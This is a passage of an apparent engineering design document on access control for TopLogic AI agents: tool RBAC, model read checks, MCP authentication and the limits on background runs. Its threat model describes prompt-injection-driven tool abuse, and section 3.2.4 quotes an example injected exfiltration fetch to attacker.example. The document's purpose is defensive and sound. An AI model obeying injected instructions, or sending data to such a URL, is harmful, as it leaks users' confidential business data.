# Security Architecture for TopLogic AI Agents

**Status:** design, with **layer L1 (tool RBAC, sections 3.2 and 4.1) implemented** and every other
layer still staged. **Enforcement is unconditional and unconfigurable** (issue **#288**): there is no
security mode and both layers apply to every run. An application that has configured nothing is not
unchecked - it gets the read-only default baseline of issue **#293** (`model.read` + `data.read`) at the
tool layer, and whatever its `<security-config>` grants at the data layer, which is nothing until it
writes one. Section 6 is the per-artifact map; [role-model-worked-example.md](role-model-worked-example.md) explains the role model
this design sits on and is the page to read *before* this one;
[tool-access-configuration.md](tool-access-configuration.md) is the administrator's guide to the part
that works; [browsing-governance.md](browsing-governance.md) is the administrator's guide to where an
agent that may browse is allowed to go; [testbed.md](../../tl-ai-demo/doc/secdemo/testbed.md) is the runnable fixture that shows it, one persona and one expected
result per behaviour.
**Depends on:** engine ticket **#29088** (`ModelAccessRights` / `SecurityConfigurationService`),
**released** in engine `8.0.0-alpha7` and present in the `8.0.0-alpha9` engine tl-ai now builds
against. All API references below are verified against that released artifact.
**Companion spec:** `specs/model-based-access-rights.md` in tl-engine-7 (the model-security design this
document builds on).
**Language:** English, to stay consistent with the engine spec and with the Javadoc of the classes
discussed here (`doc/architecture.md` is a German stakeholder overview and serves a different audience).

---

## 0. Executive summary

When a user asks a tl-ai agent for help, the agent must act **as that user** - it may use only the
tools the user's role permits, read and write only the data the user may, and must never place
forbidden data into the conversation. What decides that is a single question - **who does this run act
as** - and there is no mode, flag or agent setting that answers it differently (issue **#288**). A run
that cannot name an authenticated account does not start.

This document specifies:

1. A **threat model** for agent execution (section 2).
2. A **layered enforcement architecture** (section 3): identity -> tool RBAC -> model ABAC ->
   result pre-filtering -> pre-commit action guard -> reference guard -> audit.
3. The **admin-facing configuration** for the role-to-tool mapping the product needs (section 4),
   including config XML, tool groups and an administration-UI concept.
4. What an application has to configure, and what it gets if it configures nothing (section 5).
5. What is **built** and what is reference code only (section 6).

The two central design commitments:

- **Deny by default, everywhere.** A tool with no grant is not offered and not executable. A model
  type with no `<security-config>` grant is not readable. Both engine and agent layer already behave
  this way, and there is no longer any setting that softens it. The one deliberate exception is the
  **read-only default baseline** (#293): an application that writes no `<baseline>` grants every account
  `model.read` and `data.read`, so that configuring nothing yields a usable read-only agent rather than
  an inert one. Nothing that mutates or exports is in it. See
  [role-model-worked-example.md](role-model-worked-example.md) for the configuration to write.
- **Two independent authorizations per tool call.** A call is permitted only if
  *(a)* the user's roles grant the **tool** (RBAC, section 3.2) **and**
  *(b)* every model object the tool touches passes the **model check** (ABAC, section 3.3).
  Neither substitutes for the other: `executeTLScript` is one tool but can touch any type, and
  `listInstances` is READ-classified but can enumerate a payroll table.

**And one commitment this design does *not* make**, stated here rather than discovered in section 3:
read scoping covers **objects and attribute values**, not everything a script can compute from them. A
value TL-Script has already reduced to plain data before any output filter runs is outside it, and there
are two - a **count** (**#291**) and a **label** reached through string coercion (**#296**). Both are
accepted by design, not open work: object labels are non-secret in TopLogic, which puts the obligation
on the modeller to keep confidential information out of object names. Section 3.3.2 has the mechanism,
the engine's own statement of the rule, and the control (`filterSecurity`).

---

## 1. Where we are today (verified against the code)

| Concern | Current state | Evidence |
|---|---|---|
| Tool permission | **Enforced for every run** (was hardcoded `true`) | `TopLogicSecurityContext.hasToolPermission` answers from `ToolAuthorization`, always over the running service's policy. A policy that configures nothing grants `RoleToolAccess.IMPLICIT_BASELINE` plus `RoleToolAccess.DEFAULT_BASELINE` |
| Tool permission by name | Same | `SecurityContext.hasToolPermission(String)` still defaults to `true` for implementations that do not override it |
| Data read/write check | **Enforced through one chokepoint** | `ModelSecurity` (typed, principal-bound) is reached as `ToolContext.modelSecurity()`; `ReadFilter` is the only converter of a `TLObject` into a tool result, and `TidResolver.resolve` refuses an object the run may not read |
| Execution-mode gate | Live | `ToolPermissionFilter.java:36-45` denies `STRUCTURAL` in `PRODUCTION` |
| Approval gate | Live | `SecurityContext.checkApproval` -> `AgentLoop.java:933`; `USER_SCOPED`/`DATA_WRITE`/`STRUCTURAL`/`EXTERNAL` need approval |
| Schema filter hook | Live but no-op | `AgentLoop.java:1143` builds the provider tool list through `ToolPermissionFilter` |
| Invocation gate hook | Live but no-op | `AgentLoop.java:885-919` (`executeWithSecurityCheck`) |
| Chat identity | Correct | `ChatProcessor.buildToolContext` (`ChatProcessor.java:460-499`) installs `TopLogicSecurityContext`; tools run inside the chat user's sub-session |
| Async agent identity | Correct | `AIScriptFunctions.agentChatAsync` (`:422-436`) refuses to start without a `Person`; the background run re-enters the caller's sub-session (`:448`, `:471`) |
| TL-Script entry points | **Act as the calling account** | `ToolContext.forCurrentUser()` builds a `TopLogicSecurityContext` from `TLContext.currentUser()` and throws when the thread has none |
| Test/EMPTY context | **Unrestricted, documented as a test seam** | `ToolContext.EMPTY` and `SecurityContext.UNRESTRICTED`; no production path builds a context this way, because `TopLogicSecurityContext.forRun` requires a `Person` |
| MCP server | **Off by default; authenticated and acting as its caller when on** (#261) | `tl-ai-mcp-server`'s `web-fragment.xml` maps `McpAuthenticationFilter` to `/mcp/*`, which authenticates every request through the OpenAPI server's `Authenticator` framework (HTTP basic, API key, OAuth bearer - a per-deployment choice) and opens the `TLContext` of the resolved `Person` for the whole request. `McpAuthentication` refuses everything when the application configured no authentication, so nothing is served open. `McpToolAdapter` then builds a real `ToolContext` over `TopLogicSecurityContext.forRun(person, background = true)` and applies the same `ToolPermissionFilter` as the chat path; the resource handlers read as that account and disclose through the same `ReadFilter` chokepoint as the data tools. `MCPServerService$Module` still ships as `false`, because serving the endpoint stays an administrative decision - see [mcp-endpoint.md](mcp-endpoint.md) |
| Java data tools | **Read-filtered** (#289) | `InstanceBrowserTool` filters through `ReadFilter.readable(...)` before counting and paginating; `getInstance`, the TL-Script result and every configured script tool go through the same filter. Aggregates computed inside a script stay unfiltered and say so (**#291**) |
| Model digest | **Scoped to the principal's types** (#295) | `ModelDigestGenerator.generate(model, includeFramework, ModelSecurity, Locale)` has no form without the rights; it emits only the classes of `accessibleTypes(READ)` and drops a module whose classes are all inaccessible. Reached through `ModelBrowserTool.outlineModel`, which takes the run's `ToolExecutionContext` |
| Vector index | **Filtered at query time** (#295) | `VectorIndex.searchVectorIndex` has no form without a `ReadFilter`; `VectorReadFilter` resolves each hit's source object through `TidResolver` and drops the hit - with its text - when the source is unreadable or unattributable. Index *contents* stay unrestricted by construction, see 3.4.3 |

Two engine behaviours matter for the design and are verified against released `8.0.0-alpha7`:

- **`ThreadContext.isSystemContext()` fully bypasses model security.**
  `SecurityConfigurationService.isAllowedBypass` returns `TRUE` for a system context, and
  `BoundChecker.isAllowedBypass` returns `TRUE` for `ThreadContext.isAdmin()` and `FALSE` for a
  `null` user. This is the right semantics, but it means *how tl-ai establishes its thread context
  decides whether any model security applies at all*.
- **`ToolExecutions.execute` wraps a tool call in `ThreadContextManager.inSystemInteraction(...)`.**
  That call **reuses an existing interaction** and only creates a system interaction when none is
  bound. So the chat path keeps the user's identity (good), while a context-less background path gets
  a system interaction (full bypass). The MCP path deliberately does **not** go through it: its
  requests arrive with an authenticated account whose context the filter has opened, and it refuses
  rather than falling back to a system interaction, because that fallback is exactly what #261 was.
  `McpCallerContext` is the explicit counterpart on that path: no bound account, no read.

---

## 2. Threat model and objectives

### 2.1 Assets

| # | Asset | Why it matters |
|---|---|---|
| A1 | Business data in the `KnowledgeBase` | The primary confidentiality and integrity asset |
| A2 | Application model and configuration | Structural change is a privilege-escalation primitive: a new type, a changed annotation or a rewired agent changes everyone's security posture |
| A3 | Agent/skill/tool definitions | An agent's system prompt, tool set and delegation edges are security policy in disguise |
| A4 | Conversation transcripts | Persisted per `AgentSession`; contain whatever the agent read |
| A5 | Provider credentials and outbound network access | `webFetch`, MCP stdio servers, Gitea integration |
| A6 | The LLM context window | Everything placed in it is disclosed to the model provider and, via the transcript, to whoever can read the session |

### 2.2 Actors and trust boundaries

```
 ┌──────────────┐        ┌───────────────────────────────────┐
 │ Chat user    │──HTTP─▶│ tl-chat  (authenticated)          │
 │ (Person)     │        │  ChatProcessor.buildToolContext   │
 └──────────────┘        └───────────────┬───────────────────┘
                                         │  ToolContext(security, approval, tx)
 ┌──────────────┐        ┌───────────────▼───────────────────┐
 │ External MCP │──HTTP─▶│ McpAuthenticationFilter  /mcp/*   │──▶ 503 while the module is off
 │ client       │        │  → Person → MCPTransportServlet   │──▶ 503 if no authentication configured
 └──────────────┘        └───────────────┬───────────────────┘──▶ 401/403 without a valid credential
                                         │  ToolContext(background), ReadFilter(person)
                                         │
 ┌──────────────┐        ┌───────────────▼───────────────────┐        ┌──────────────┐
 │ Scheduler /  │───────▶│ AIScriptFunctions.agentChatAsync  │───────▶│  AgentLoop   │
 │ TL-Script    │        │  (Person required)                │        │  ToolCatalog │
 └──────────────┘        │ AIScriptFunctions.callTool/chat   │        └──────┬───────┘
                         │  (acts as the calling account)    │               │
                         └───────────────────────────────────┘               ▼
                                                                    ┌──────────────────┐
    ══════ trust boundary ══════════════════════════════════════════│ KnowledgeBase /  │
    Untrusted input crosses here: user prompts, tool RESULTS,        │ TLModel / files  │
    MCP tool descriptions, fetched web pages, RAG chunks.            └──────────────────┘
```

The decisive property: **everything that enters the context window is untrusted input, including
tool results.** The LLM is not a security boundary and must never be relied on to enforce policy.
All gates in this design are deterministic Java checks on the call path, never prompt instructions.

### 2.3 Threats

| # | Threat | Realised today? | Addressed by |
|---|---|---|---|
| **T1** | **Agent over-privilege.** The agent can invoke any tool in its catalog regardless of who is chatting; a read-only clerk can drive `ModelEditorTool`. | **Addressed** where an application configures `<tool-access>`; otherwise yes | L1 (3.2), built |
| **T2** | **Data over-read.** `listInstances`/`getInstance`/`searchModel` return objects the user may not see; the answer, the transcript and the SSE stream all carry them. | **Addressed for instances** (#289): objects and attribute values are filtered per object and per attribute. Two values a script reduces to plain data before any filter runs are outside it and accepted by design: cardinality (**#291**) and labels reached through string coercion (**#296**, see 3.3.2) | L2 (3.3), L3 (3.4) |
| **T3** | **Prompt-injection-driven tool abuse.** A malicious value stored in a business object, an MCP tool description, or a fetched web page instructs the agent to call a write tool or exfiltrate data. | Yes | L1+L2+L4; approval for write modes; *not* mitigated by prompting |
| **T4** | **Exfiltration via an outbound tool.** The agent is induced to put secret data into a `webFetch` URL, a Gitea issue body, or an MCP call to an external server. | Yes | L2 on the read side (it never gets the data), plus egress classification (3.2.4) |
| **T5** | **Unattended/background over-privilege.** `agentChatAsync` runs with `ApprovalCallback.AUTO_APPROVE`: every approval-gated tool self-approves. | **Bounded** by the background allowlist | 3.1 (identity), 3.2.5 (background tool floor) |
| **T6** | **The unrestricted bypasses.** `ToolContext.createUnrestricted()` used to grant `SecurityContext.UNRESTRICTED` + `AUTO_APPROVE` + `DEVELOPMENT` mode from a production path. | **Closed**: `createUnrestricted` is gone and the remaining permissive constructs are test seams | 3.1 |
| **T7** | **The MCP bypass.** `/mcp/*` used to authenticate nobody: every adapted tool executed with a `null` `ToolContext` in a system interaction - the engine's super-user bypass - and every *resource* read did the same, so anyone who reached the port could read any object by TID. | **Closed** (#261): every request is authenticated to a `Person` and runs in that account's context; tool calls are authorized by `<tool-access>` and bounded by the background allowlist, and resource reads go through the `ReadFilter` chokepoint. An application that configures no authentication serves nothing, and the module still ships off. `tools/list` remains unfiltered per caller (SDK limitation) | 3.1, 3.7, [mcp-endpoint.md](mcp-endpoint.md) |
| **T8** | **Privilege escalation via self-modification.** `AgentAuthoringTool`, `FrameworkWiringTool`, `ScriptToolAuthoringTool` let an agent create agents, add tools to agents and define new script tools. An agent that may edit agents can grant itself any tool. | Yes | 3.2.3 (privileged group), 3.2.6 (delegation cannot widen) |
| **T9** | **Privilege escalation via self-selected security level.** Nothing stopped a caller from constructing a permissive `SecurityContext` or picking a laxer mode. | **Closed structurally**: there is no mode to pick, and no production path builds a permissive context | 3.1 |
| **T10** | **RAG / vector-index leakage.** `searchVectorIndex` returned chunks derived from indexed objects with no per-user filter; the index is built by a background daemon under system rights. | **Addressed at query time** (#295): a hit whose source object the caller may not read is dropped before it reaches anybody, and a hit that cannot be attributed to an object is dropped too. That the *embedding* was computed from unfiltered text is accepted and stated, not fixed | 3.4.3 |
| **T11** | **Schema disclosure.** The model digest enumerated every module, type and attribute of the application. | **Closed** (#295): the digest emits only `accessibleTypes(READ)` and cannot be generated without a principal | 3.4.2 |
| **T12** | **Write without authority reaching the commit.** Any tool that forgot its check (or a future/MCP tool that never had one) writes through the shared `TransactionScope`, and the end-of-turn commit persists it. **Closed for an enforcing run** by 3.5. | Yes | 3.5 (pre-commit guard) · **implemented** |
| **T13** | **Cross-session/transcript disclosure.** Session transcripts persist whatever the agent read; a later reader of the session sees data they may no longer be entitled to. | Partially | Out of scope here, see 2.5 |

### 2.4 Objectives

- **O1 - Act as the user.** Every agent run has exactly one authenticated `Person`, resolved once and
  immutable for the run. No `Person`, no run (in `ENFORCED`).
- **O2 - Least privilege on tools.** A user may invoke a tool only if a role they hold is granted that
  tool. Unknown/new tools default to denied.
- **O3 - Least privilege on data.** Every model access performed on the user's behalf is checked with
  `ModelAccessRights` against that `Person`.
- **O4 - Deny by default.** Absence of configuration denies. This holds independently at the tool
  layer and at the model layer.
- **O5 - Defense in depth.** Filtering the tool list is a UX affordance, never the enforcement point;
  every layer re-checks. A tool that skips its own check is still caught before commit.
- **O6 - Separation of duties.** Who may *use* an agent, who may *define* agents/tools, and who may
  *write the security policy* are three different privileges.
- **O7 - Auditability.** Every denial, every bypass, and every rolled-back write is logged with run,
  turn, user, tool and reason.
- **O8 - Explainability.** A denial produces a reason the model can act on ("you lack role X") and an
  operator can trace, without disclosing the content that was withheld.

### 2.5 Non-goals

- **Not a defense against a malicious model provider.** Data that legitimately reaches the context
  window is disclosed to the provider by construction.
- **Not "scan the answer for secrets".** By the time text is emitted it has already been streamed
  over SSE. Post-hoc redaction of free text is theatre; we pre-filter instead (section 3.4). The one
  deterministic output check we do keep is the *reference* guard (section 3.6).
- **Not prompt-injection immunity.** We reduce the blast radius (an injected instruction can only do
  what the user could do) rather than claiming to detect injection.
- **Not retroactive transcript re-authorization (T13).** Making historic transcripts re-evaluate
  today's permissions is a separate ticket; the mitigation here is that less gets into them.
- **Not the model-security policy itself.** *Which* roles may read *which* types is the application's
  `<security-config>` (#29088). This document defines how tl-ai *consumes* it.
- **Not a credential mechanism of our own for `/mcp/*`.** The endpoint authenticates (section 3.7,
  issue **#261**), and it does so by reusing the engine's existing `Authenticator` framework, so
  *which* credential a deployment accepts - HTTP basic, an API key, an OAuth bearer token - is that
  deployment's configuration and not a product decision. Not done: RFC 9728 protected-resource
  metadata, so an OAuth client cannot discover this server automatically, and per-caller `tools/list`
  filtering, which the MCP Java SDK does not support. See [mcp-endpoint.md](mcp-endpoint.md).

---

## 3. The layered architecture

```
                       ┌─────────────────────────────────────────────┐
   run starts  ───────▶│ L0  Identity                                │  once per run
                       │     Person required, or the run is refused  │
                       └───────────────────┬─────────────────────────┘
                                           │
                       ┌───────────────────▼─────────────────────────┐
   build request ─────▶│ L1a Tool RBAC - schema filter (UX)          │  every turn
                       │     ToolPermissionFilter @ AgentLoop:1143   │
                       └───────────────────┬─────────────────────────┘
                                           │
                       ┌───────────────────▼─────────────────────────┐
   tool call  ────────▶│ L1b Tool RBAC - invocation gate (SAFETY)    │  every call
                       │     executeWithSecurityCheck @ AgentLoop:885│
                       │     + ExecutionMode gate + approval         │
                       └───────────────────┬─────────────────────────┘
                                           │
                       ┌───────────────────▼─────────────────────────┐
   inside the tool ───▶│ L2  Model ABAC via ModelAccessRights        │  every object
                       │     ctx.modelSecurity().canRead/Write/Create│
                       └───────────────────┬─────────────────────────┘
                                           │
                       ┌───────────────────▼─────────────────────────┐
   before serialize ──▶│ L3  Result pre-filter                       │  every result
                       │     ReadFilter + digest scope + RAG filter  │
                       └───────────────────┬─────────────────────────┘
                                           │
                       ┌───────────────────▼─────────────────────────┐
   end of turn  ──────▶│ L4  Pre-commit action guard                 │  every commit
                       │     PreCommitGuard @ commitTransaction      │
                       └───────────────────┬─────────────────────────┘
                                           │
                       ┌───────────────────▼─────────────────────────┐
   emit answer  ──────▶│ L5  Reference guard (links/ids only)        │
                       │     + HTML allow-list on the rendered answer│
                       └───────────────────┬─────────────────────────┘
                                           │
                       ┌───────────────────▼─────────────────────────┐
                       │ L6  Audit log (denials, bypasses, rollbacks)│
                       └─────────────────────────────────────────────┘
```

Layers are **independent**: L1 does not assume L2 ran, L4 does not assume L2 ran. That is the point -
L4 exists precisely because some tool will forget L2.

### 3.1 L0 - Identity · **implemented**

**There is no security mode.** Both enforcement layers apply to every agent run, unconditionally and
unconfigurably. What a run may do follows from a single question - *who does it act as* - and a run
that cannot answer it does not start.

`AiSecurityMode` used to sit here with the values `LEGACY`, `SYSTEM` and `ENFORCED`, and a run's
effective mode was `stricter(deploymentCeiling, agentFloor)`. All of it is gone (issue **#288**). The
reasoning is worth keeping, because it is what a future proposal to reintroduce a bypass has to answer:

- **`LEGACY` was migration machinery for an installed base that does not exist.** tl-ai runs in no
  productive application, so nothing needed migrating - and as the default it masked every enforcement
  gap, because an unfiltered tool result looks harmless when nothing is enforced anyway.
- **`SYSTEM` was a total bypass, not a bounded one.** `TopLogicSecurityContext.build` set *both*
  `ModelSecurity` and `ToolAuthorization` to `UNCHECKED` unless the mode was `ENFORCED`, and the
  `<background-allowlist>` lives inside `ToolAuthorization` - so it never applied to a `SYSTEM` run.
  `SYSTEM` meant unlimited reach, audited.
- **`SYSTEM` on an agent only ever worked because `LEGACY` existed.** The comparison was numeric
  (`LEGACY=0, SYSTEM=1, ENFORCED=2`), so `stricter(ENFORCED, SYSTEM)` returned `ENFORCED`. Once every
  deployment enforces, an agent's `SYSTEM` declaration is already inert.
- **Keeping it would have created an escalation path.** With no `LEGACY`, `SYSTEM` is *laxer* than the
  default, so letting an agent definition ask for it would mean editing an agent definition buys
  unlimited reach over all data. Reading the per-agent value as a floor existed precisely to remove
  that direction.

The root cause is that the enum was a single strictness line over two independent questions - *is
enforcement on* and *who is the principal*. `SYSTEM` answered the second, so it was never comparable
by strictness to begin with. Splitting them is what this section now does: enforcement is not a
question, and identity is answered per entry point.

#### Identity: every run carries a `Person`, or refuses to start

`TopLogicSecurityContext.forRun(Person, boolean)` is the single production entry point, and it throws
when the principal is `null`. Refusing where the context is built rather than at the first tool call is
deliberate: a run without a principal cannot be authorized, and failing later wastes a provider round
trip and produces a confusing half-run.

| Entry point | Principal |
|---|---|
| `ChatProcessor` (`/chat/*`) | the logged-in chat user. `ChatSessionFilter` has already rejected an unauthenticated caller |
| `AIScriptFunctions.aiAgentChat` | the account that executed the script (`ToolContext.forCurrentUser()`) |
| `AIScriptFunctions.aiAgentChatAsync` | the same account; the function already refuses a sub-session without a `Person`, and the background run re-enters that sub-session |
| Delegated child, detached subagent | the parent's principal, inherited unchanged |
| `/mcp/*` | the account the request's credential names. `McpAuthenticationFilter` rejects a request it cannot attribute to one - and rejects a credential mapped to *no* account, which the framework would otherwise read as "run this in system context". The run is classified **background**, because an MCP caller has nobody to answer an approval prompt (section 3.7, [mcp-endpoint.md](mcp-endpoint.md)) |
| A future scheduler entry point | must supply a **configured service account** - a real account holding real roles, administered like any other. There is no mode that lets it run without one |

The resolved `Person` is captured on the `SecurityContext` at construction and is **not** re-read from
`TLContext` per check: a concurrent tool batch runs on worker threads that re-establish the
sub-session, and a design that re-reads thread state per check is one thread-local bug away from
checking the wrong user.

Threat **T9** was escalation by self-selection. Its answer is now structural rather than a comparison
rule: there is no mode input at all, from the caller, the model or an agent definition. An agent
definition declares no security mode, and `AgentDefinition` carries no field for one.

**Delegation and subagents.** A child run inherits its parent's `SecurityContext` unchanged, so it can
never come out wider than its parent. A detached subagent additionally loses the approval prompt when
the parent turn ends, so `ToolContext.forDetachedSubagent` narrows it by the
`<background-allowlist>` - see section 3.2.5. Attendedness is a genuinely separate property from
identity, which is why the `background` flag stays while the mode goes.

#### What is left of "unrestricted"

Three permissive constructs survive, all explicitly test seams and none reachable from a production
path:

| Construct | Why it exists |
|---|---|
| `SecurityContext.UNRESTRICTED` | a context with no principal, for unit tests of anything that merely needs *a* context |
| `ToolContext.EMPTY` | the same, wrapped with `AUTO_APPROVE` and a no-op transaction scope |
| `ModelSecurity.UNCHECKED`, `ToolAuthorization.UNCHECKED`, `PreCommitGuard.PERMISSIVE` | the engine's model rights need a booted `SecurityConfigurationService` and the tool policy a booted `AiToolAccessService`; a unit test about how a context *behaves* has neither |

`ToolContext.createUnrestricted()` and the `forCurrentUser` fallback to it are gone, as are
`SecurityContext.restrictedTo`, `ToolContext.restrictedTo` and
`AgentDefinitionQuery.securityFloorOf`. `AiToolAccessService.authorizationFor` and
`ModelAccessRightsSecurity` both throw when their service is down, rather than granting everything -
both services are registered active by default, so absence is a deliberate deactivation and not a
state to be permissive about.

#### The consequence an administrator meets first

**Every application must ship a `<security-config>`, or its agent can read nothing.**
`SecurityConfigurationService` is registered active by default in every TL 8 application (`tl-core`'s
web fragment sets its module to `value="true"`) and instantiates with empty rights, which is deny-all
for role-based users. An application that writes no `<security-config>` has not opted out of model
security; it has denied everything.

The tool layer is deliberately kinder about the same silence, and only there. An absent `<tool-access>`
matrix grants `RoleToolAccess.IMPLICIT_BASELINE` plus `RoleToolAccess.DEFAULT_BASELINE` - `model.read`
and `data.read` - so that an application which has configured nothing has a usable, read-only agent
instead of an inert one (issue **#293**). Nothing in that default mutates (`data.write`,
`model.structure`, `agent.authoring`, `agent.meta`, `workspace`), sends data outward (`egress`) or
reaches every type (`script`). An application that writes a `<baseline>` replaces it; `<baseline/>`
says "nothing for everyone".

> **What the default rests on.** The argument that a default `data.read` is safe is that L1 grants the
> *ability to ask* and L2 answers per object. Since **#289** that is true of the data tools: every
> instance they disclose passes the read filter, and an application with no `<security-config>` has
> denied everything, so its agent reads nothing. What the default still does not bound is a *count*
> computed inside TL-Script, which no read filter can see into (**#291**); `script` is not in the
> default baseline for that reason among others.

Administrators and engine super-users bypass all of it, and so does any code in a system context, so
**testing with an admin account proves nothing**.
[role-model-worked-example.md](role-model-worked-example.md) is the configuration to follow: one role
vocabulary, two grant tables, four personas walked through every operation.

Genuine framework-internal bypasses - security storage rebuild, migrations - already have
`ThreadContext.inSystemContext` in Java. That is where a bypass belongs, not in agent configuration.


### 3.2 L1 - Tool authorization (role-based) · **implemented**

This is the capability the product needs: **an administrator decides which security roles may use
which tools.** Built as described below, minus the administration UI of section 4.3; see section 6 for
the artifact-by-artifact status and [tool-access-configuration.md](tool-access-configuration.md) for the
administrator's view.

#### 3.2.1 The decision

```
allowTool(person, tool, agent) :=
        roleGrantsTool(person, tool)                  // RBAC, section 3.2.2
   AND  agent.tools contains tool                     // per-agent grant, existing
   AND  executionModeAllows(tool.mode())              // existing, ToolPermissionFilter:40
```

**Both** the role grant and the per-agent grant must allow. They answer different questions:

- The **agent's tool list** is a *capability scope*: "this assistant is about invoices, so it has the
  invoice tools." It is authored by an application developer, versioned with the agent.
- The **role grant** is an *authorization*: "clerks may not restructure the model." It is authored by
  a security administrator, and it is the one that must hold even when someone edits an agent (T8).

An agent may therefore never widen a user's rights, which is what makes agent authoring a
capability-management action rather than a privilege-granting one.

#### 3.2.2 `roleGrantsTool`

```
roleGrantsTool(person, tool) :=
     person.isAdmin()                                      // engine super-user, mirrors BoundChecker
  OR ( exists role r in rolesOf(person, securityRoot) :
         policy.grants(r, tool)  AND  NOT policy.denies(r, tool) )
```

- **Roles are read on the security root.** Tool access is a global capability ("may this person use
  the model editor at all"), not an instance-scoped one; per-instance nuance belongs to L2. Reading
  roles on `BoundHelper.getInstance().getDefaultObject()` matches how `ModelAccessRights` treats
  top-level CREATE (spec 2.3.6).
- **Grants are additive across the user's roles, denies win.** Union of the grants of all held roles,
  minus anything explicitly denied by any held role. An explicit `<deny>` is a hard stop - it exists so
  an administrator can carve `STRUCTURAL` out of an otherwise broad grant without re-enumerating.
- **No grant means denied.** Consistent with O4 and with the engine (`getAccessibleTypes` skips types
  with an empty role set: "Deny-by-default: a type without a grant for the command group is never
  accessible.").
- **Admin bypass mirrors the engine.** `person.isAdmin()` already bypasses `ModelAccessRights`
  (`AccessManager.hasRole:122`); having the tool layer disagree would produce an unexplainable
  half-denial.

#### 3.2.3 Tool groups

Thirty-plus tools cannot be administered one by one. Every tool belongs to exactly one **primary
group**; groups are the unit of granting.

| Group | Contents (verified from the current registry) | Default |
|---|---|---|
| `model.read` | `listModules`, `listTypes`, `listTypeParts`, `listClassifiers`, `outlineModel`, `describeAnnotation`, `getCurrentAnnotations`, `listAvailableAnnotations`, `findTypeUsages`, `findPartUsages`, `getConfigSchema`, `listLayoutTemplates`, `getLayout`, `getTopLevelLayoutKey` | grantable |
| `data.read` | `listInstances`, `getInstance`, `searchModel`, `searchVectorIndex`, `checkLock` | grantable |
| `data.write` | (currently only `executeTLScript` with `withCommit=true`, checked inside the tool; future typed instance-write tools) | grantable, approval |
| `script` | `validateTLScript`, `executeTLScript`, `listTLScriptFunctions`, `getTLScriptFunctionDocumentation` | **privileged**, read-only - the commit path additionally costs `data.write` |
| `model.structure` | `createModule`, `updateModule`, `createClass`, `updateClass`, `createProperty`, `updateProperty`, `createReference`, `createBackwardReference`, `createEnumeration`, `updateEnumeration`, `deleteModelElement`, `addAnnotation`, `removeAnnotation`, `createLayout` | **privileged** |
| `agent.authoring` | `createAgent`, `updateAgent`, `deleteAgent`, `createSkill`, `updateSkill`, `deleteSkill`, `createScriptTool`, `updateScriptTool`, `deleteScriptTool`, `addToolToAgent`, `removeToolFromAgent`, `addSkillToAgent`, `removeSkillFromAgent`, `addDelegationToAgent`, `removeDelegationFromAgent`, `addToolToSkill`, `removeToolFromSkill` | **privileged** |
| `agent.meta` | `listAgents`, `getAgent`, `listSkills`, `getSkill`, `listScriptTools`, `getScriptTool`, `listAvailableTools`, `listFrameworkAgents`, `getFrameworkAgent`, `listFrameworkSkills`, `getFrameworkSkill`, `listScriptToolFactories` | grantable |
| `interaction` | `askUser`, `loadSkill`, delegation and subagent tools | granted to every agent user by the built-in baseline |
| `introspection` | `listTools` - what *this* agent carries, filtered for the acting user | granted to every agent user by the built-in baseline |
| `workspace` | `createTask`, `updateTask`, `listTasks`, `publishPage` | grantable |
| `egress` | `webFetch`, `webSearch`, `createGiteaIssue`, all `mcp__*` tools | grantable, **never** in the baseline |

**Privileged** groups are the ones whose holder can escalate their own rights: `script`,
`model.structure` and `agent.authoring`, because each is a general-purpose escalation primitive -
`executeTLScript` can express any data operation, `model.structure` can change the shape the security
policy is written against, and `agent.authoring` can rewire who gets which tools (T8). The
classification is documentary, not mechanical: no group is reached except by a `<grant>` naming it, so
there is no implicit path a privileged group would have to be excluded from. What it says is that
granting one is an audited configuration change worth arguing about first.

Note `executeTLScript` sits in a privileged group *and* is `DATA_WRITE`-classified *and* rides on the
engine's TL-Script enforcement (which #29088 already applies). Three independent reasons for it to be
safe; each one alone would be insufficient.

A fourth, and the one that makes the `data.write` row above true rather than aspirational: the group
gates the *tool*, and `withCommit=true` is what makes the call persist, so **the commit path requires
`data.write` in addition to `script`**. The gate cannot enforce that - it decides per tool, before the
arguments - so the tool asks the run's own `ToolAuthorization` for the capability, which applies the same
order (background allowlist, administrator bypass, role grants) it applies to a tool. Without it, every
holder of `script` held every write TL-Script can express, and an allowlisted `script` handed that to
unattended runs, which auto-approve.

A tool's group is declared on the tool, not in the policy file, so a new tool cannot be silently
ungrouped:

```java
@ToolMethod(
    description = "...",
    mode = ToolMode.READ,
    group = "data.read")                       // NEW - defaults to "" => ungrouped
```

An **ungrouped tool is denied to every role** except by an explicit per-tool grant naming it. That is
the deny-by-default answer to "what happens when someone adds a tool and forgets" (O4).

#### 3.2.4 Egress classification

`egress` is a group, not a mode, because `ToolMode` describes *what state the tool changes locally* and
says nothing about *where data goes*. `webFetch` is `ToolMode.READ` and is the single best exfiltration
primitive in the catalog (T4): an injected instruction that says "fetch
`https://attacker.example/?d=<the customer list>`" is a `READ` call.

Being in `egress` has two consequences beyond ordinary granting:

- Never included in the built-in baseline.
- An egress call in the same *turn* as a `data.read` call against a restricted type is recorded in the
  audit log as a correlated pair. This is detection, not prevention - prevention is L2 ensuring the
  agent never held the data.

**Granting `egress` says the agent may send data out; it does not say where to.** That is the
*browsing policy* (#347), configured on `WebToolsService` and resolved per security role: which origins
a run may reach at all, with a separate axis for whether a page there may hand it a file. It binds the
browser, `webFetch` and `webSearch` alike, it is the ceiling a model-supplied `allowedDomains` can only
narrow, and it composes with - never relaxes - the unconditional SSRF check of `UrlSafety`. An
application that configures none is bound by nothing extra, which is what every installation before
#347 was. See [browsing-governance.md](browsing-governance.md).

#### 3.2.5 Background and delegated runs

- **Background runs** (`agentChatAsync`, scheduler, MCP) run with `AUTO_APPROVE` (T5). Their tool
  ceiling is the *intersection* of the user's role grants and the configured
  `<background-allowlist>`. Rationale: approval is the compensating control for
  `DATA_WRITE`/`STRUCTURAL`, and a run with nobody to ask has lost that control, so it must not reach
  those modes without an explicit administrative decision.
  There is **no default allowlist**, and no default is possible: the allowlist is the whole
  compensating control, so an absent one cannot mean "unrestricted" (which would silently undo the
  layer for any administrator who never learned the element exists) and cannot mean a framework-chosen
  set either (which would be a security decision taken on the administrator's behalf). An enforcing
  policy that declares none is therefore a **boot-time configuration error**, and the explicit opt-out
  `<background-allowlist all="true"/>` exists so that "bounded only by the user's grants" remains
  sayable - out loud.
- **Synchronously delegated sub-agents** (`DelegationTool` without an async session) inherit the
  parent's `SecurityContext` unchanged (`ToolContext.forDelegation`) and are additionally bounded by
  the child agent's own tool list. A child can therefore only ever be a *subset* of the parent's
  authority (T8): delegation is not an escalation path. The classification is carried over as it
  stands, background flag included, because a synchronous delegation completes *inside* the parent
